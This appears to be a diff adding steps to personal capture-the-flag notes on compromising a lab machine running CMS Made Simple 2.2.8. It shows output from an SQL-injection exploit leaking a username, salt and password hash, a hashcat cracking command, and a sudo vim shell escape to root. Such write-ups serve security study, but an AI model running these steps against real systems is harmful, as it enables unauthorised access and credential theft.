@@ -4,7 +4,24 @@
 
 Found: {"/simple", "/server-status"}
 
-In the bottom of the webpage found copyright section where contains the following text: "This site is powered by CMS Made Simple version 2.2.8". Search "cms made simple version 2.2.8 cve" and chose the highest scored CVE.
+In the bottom of the webpage found the copyright section where contains the following text: "This site is powered by CMS Made Simple version 2.2.8". Search "cms made simple version 2.2.8 cve" and chose the highest scored CVE.
 
 Ran: owasp-zap 
 
+exploit.py OUTPUT:
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96$
+
+>> hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
+
+SSH-PASSWORD: secret
+
+list the permissions and privileges >> sudo -l
+
+(root) NOPASSWD: /usr/bin/vim
+
+Since we can run "vim" with root privileges we check GTFObins
+
+Added "sudo" when didn't work without it >> vim -c ':!/bin/sh'
